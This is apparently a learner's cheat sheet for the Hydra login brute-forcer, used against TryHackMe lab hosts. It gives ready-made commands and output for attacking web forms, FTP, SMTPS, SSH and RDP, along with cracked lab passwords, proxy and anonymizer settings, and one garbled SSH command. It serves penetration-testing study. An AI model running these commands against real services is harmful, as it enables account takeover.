
https://www.kali.org/tools/hydra/
https://github.com/vanhauser-thc/thc-hydra




find method, url including port and everything

![The HTML code related to the PIN code form.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c55803e3eccf061b8beeae6268b9dae1.png)  

`hydra -l '' -P 3digits.txt -f -v 10.10.145.83 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`

### HTTP

Help for the module: `hydra http-get-form -U`

Syntax: `<url>:<form parameters>[:<optional>[:<optional>]:<condition string>`

```sh
hydra -V -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
```

don't follow found redirects 302s
```sh
hydra -V -l milesdyson -P logs/log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:2=:F=ERROR" 
```

```sh
hydra -V -t 50 -l admin -P /usr/share/wordlists/fasttrack.txt http-get admin.ironcorp.me -s 11025
```

```sh
hydra -l phillips -P clinic.lst -f -v 10.10.56.136 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:Login failed"
```

tibs example, the http example with  :// syntax
```sh
hydra -L usernames.txt -P passwords4.txt -f -v http-post-form://10.10.206.140/login.php:"username=^USER^&password=^PASS^":"Please enter the correct credentials"
```

#### sometimes we need to paste the whole darn post request message in there

request
```http
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.33.96
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 753
Origin: http://10.10.33.96
Connection: close
Referer: http://10.10.33.96/Account/login.aspx?ReturnURL=%2fadmin%2f
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

__VIEWSTATE=739NLYehbVYTgcsT9MztSdVb9QEhfAC4FymQJnODfBpjxkndsqI3Dz%2FOXKlUl51ywfoCdLOfybT9XHhX5UKcNGejl8A%2BciqWntPJSQga1yjFHKF8GFoA4XZQ4tV1gC%2FLy3gJz7qDIXdmuzW2xvDy%2BYPU5%2FntI30VAUMlm0Qze9WapEmYcBiBXiYk4BQFvHSuLYV1GzzeRQJIUv%2BtgfnDUWVaI4rGU4Ldzg3ymxKAKwlzkKiKRA827EYXNOOKdUbC5Je7OsCCMmzqQtSlUagxalP0GrzPdsrblzmPX8g%2FOQ%2BKtXr8peqdJjoywRlODikX7BuksXpeBZhLRMdB3hb1HPTb4b8vFJyFhma0tAJxnEn8OPj2&__EVENTVALIDATION=Qc9USeO0OpCXEP5aai1%2BEBILE7cboM%2FmMGZ%2BWaekJZxVwduBH2nMGNvHFcPSCHklQVDAId5prwuf4WMPdJdXgn0C9zrvnKohvHft5dk%2BUgCXmc4UITYnXHg5JkMUc7daIqSESuAHOVUwHPkAMyquYl5wvHJOxLMNyNMBYxdUOqTK2BCE&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=password&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```

hydra command (thm hackpark):
```sh
hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.33.96 http-post-form "/Account/login.aspx:__VIEWSTATE=739NLYehbVYTgcsT9MztSdVb9QEhfAC4FymQJnODfBpjxkndsqI3Dz%2FOXKlUl51ywfoCdLOfybT9XHhX5UKcNGejl8A%2BciqWntPJSQga1yjFHKF8GFoA4XZQ4tV1gC%2FLy3gJz7qDIXdmuzW2xvDy%2BYPU5%2FntI30VAUMlm0Qze9WapEmYcBiBXiYk4BQFvHSuLYV1GzzeRQJIUv%2BtgfnDUWVaI4rGU4Ldzg3ymxKAKwlzkKiKRA827EYXNOOKdUbC5Je7OsCCMmzqQtSlUagxalP0GrzPdsrblzmPX8g%2FOQ%2BKtXr8peqdJjoywRlODikX7BuksXpeBZhLRMdB3hb1HPTb4b8vFJyFhma0tAJxnEn8OPj2&__EVENTVALIDATION=Qc9USeO0OpCXEP5aai1%2BEBILE7cboM%2FmMGZ%2BWaekJZxVwduBH2nMGNvHFcPSCHklQVDAId5prwuf4WMPdJdXgn0C9zrvnKohvHft5dk%2BUgCXmc4UITYnXHg5JkMUc7daIqSESuAHOVUwHPkAMyquYl5wvHJOxLMNyNMBYxdUOqTK2BCE&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

### https

```sh
┌──(kali㉿kali)-[~]
└─$ hydra -l '' -P 3digits.txt -f -v 10.10.145.83 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-03 18:33:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4096 login tries (l:1/p:4096), ~256 tries per task
[DATA] attacking http-post-form://10.10.145.83:8000/login.php:pin=^PASS^:Access denied
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
...
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/control.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[VERBOSE] Page redirected to http[s]://10.10.145.83:8000/error.php
[8000][http-post-form] host: 10.10.145.83   password: 6F5
[STATUS] attack finished for 10.10.145.83 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-03 18:35:47

```

### ftp

```sh
hydra -l user -P passlist.txt ftp://10.10.x.x
```

funny output since anonymous ftp is active, all passwords are valid :D
```sh
┌──(kali㉿kali)-[~]
└─$ hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://10.10.52.174
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-04 01:27:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.52.174:21/
[21][ftp] host: 10.10.52.174   login: ftp   password: 123456
[21][ftp] host: 10.10.52.174   login: ftp   password: 12345
...
[21][ftp] host: 10.10.52.174   login: ftp   password: lovely
[21][ftp] host: 10.10.52.174   login: ftp   password: jessica
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-04 01:27:02
```
-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.


ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.

### SMTP

```sh
hydra -l pittman@clinic.thmredteam.com -P clinic-pass.lst smtps://10.10.52.174:465 -v
```

```sh
┌──(kali㉿kali)-[~]
└─$ hydra -l pittman@clinic.thmredteam.com -P clinic-pass.lst smtps://10.10.52.174:465 -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-04 01:48:17
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 42000 login tries (l:1/p:42000), ~2625 tries per task
[DATA] attacking smtps://10.10.52.174:465/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
...
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[465][smtp] host: 10.10.52.174   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
[STATUS] attack finished for 10.10.52.174 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-04 01:48:25
```

### SSH

```sh
hydra -L users.lst -ssh://P /path/to/wordlist.txt ssh://10.10.x.x -v

hydra -V -t 50 -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.183.107
```

### RDP

```sh
hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
```



### Proxying Hydra
https://github.com/vanhauser-thc/thc-hydra

The environment variable HYDRA_PROXY_HTTP defines the web proxy (this works
just for the http services!).
The following syntax is valid:

```sh
HYDRA_PROXY_HTTP="[http://123.45.67.89:8080/](http://123.45.67.89:8080/)"
HYDRA_PROXY_HTTP="http://login:password@123.45.67.89:8080/"
HYDRA_PROXY_HTTP="proxylist.txt"
```

The last example is a text file containing up to 64 proxies (in the same
format definition as the other examples).

For all other services, use the HYDRA_PROXY variable to scan/crack.
It uses the same syntax. eg:

```sh
HYDRA_PROXY=[connect|socks4|socks5]://[login:password@]proxy_addr:proxy_port
```

for example:

```sh
HYDRA_PROXY=connect://proxy.anonymizer.com:8000
HYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080
HYDRA_PROXY=socksproxylist.txt
```

For BURP:
```sh
export HYDRA_PROXY_HTTP='http://localhost:8080'
```

### Help

```sh
┌──(kali㉿kali)-[~]
└─$ hydra -h                                                                      
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -I        ignore an existing restore file (don´t wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -r        use a non-random shuffling method for option -x
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
  -O        use old SSL v2 and v3
  -K        do not redo failed attempts (good for -M mass scanning)
  -q        do not print messages about connection errors
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs.
Licensed under AGPL v3.0. The newest version is always available at;
https://github.com/vanhauser-thc/thc-hydra
Please don´t use in military or secret service organizations, or for illegal
purposes. (This is a wish and non-binding - most such people do not care about
laws and ethics anyway - and tell themselves they are one of the good ones.)
These services were not compiled in: afp ncp oracle sapr3 smb2.

Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh

```

### Help - http-post-form

```sh
┌──(kali㉿kali)-[~/thm/skynet]
└─$ hydra http-post-form -U
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-17 15:30:43

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters requires at a minimum three ":" separated values,
plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\"" with "\\".)

Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>

First is the page on the server to GET or POST to (URL), e.g. "/login".
Second is the POST/GET variables (taken from either the browser, proxy, etc.)
 without the initial '?' character and the usernames and passwords being
 replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
 ("^PASS64^" for base64 encodings).
Third are optional parameters (see below)
Last is the string that it checks for an *invalid* login (by default).
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong! You have to check the webapp what a
 failed string looks like and put it in this parameter! Add the -d switch to see
 the sent/received data!
 Note that using invalid login condition checks can result in false positives!

The following parameters are optional and are put between the form parameters
  and the condition string; seperate them too with colons:
 2=                  302 page forward return codes identify a successful attempt
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it`s already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end

Note that if you are going to put colons (:) in your headers you should escape
them with a backslash (\). All colons that are not option separators should be
escaped (see the examples above and below).
You can specify a header without escaping the colons, but that way you will not
be able to put colons in the header value itself, as they will be interpreted by
hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=

```
### Help - http-get-form

```sh
┌──(kali㉿kali)-[~]
└─$ hydra http-get-form -U
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-07 14:33:37

Help for module http-get-form:
============================================================================
Module http-get-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters requires at a minimum three ":" separated values,
plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)    "

Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>

First is the page on the server to GET or POST to (URL), e.g. "/login".
Second is the POST/GET variables (taken from either the browser, proxy, etc.)
 without the initial '?' character and the usernames and passwords being
 replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
 ("^PASS64^" for base64 encodings).
Third are optional parameters (see below)
Last is the string that it checks for an *invalid* login (by default).
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong! You have to check the webapp what a
 failed string looks like and put it in this parameter! Add the -d switch to see
 the sent/received data!
 Note that using invalid login condition checks can result in false positives!

The following parameters are optional and are put between the form parameters
  and the condition string; seperate them too with colons:
 2=                  302 page forward return codes identify a successful attempt
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it´s already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end

Note that if you are going to put colons (:) in your headers you should escape
them with a backslash (\). All colons that are not option separators should be
escaped (see the examples above and below).
You can specify a header without escaping the colons, but that way you will not
be able to put colons in the header value itself, as they will be interpreted by
hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=

```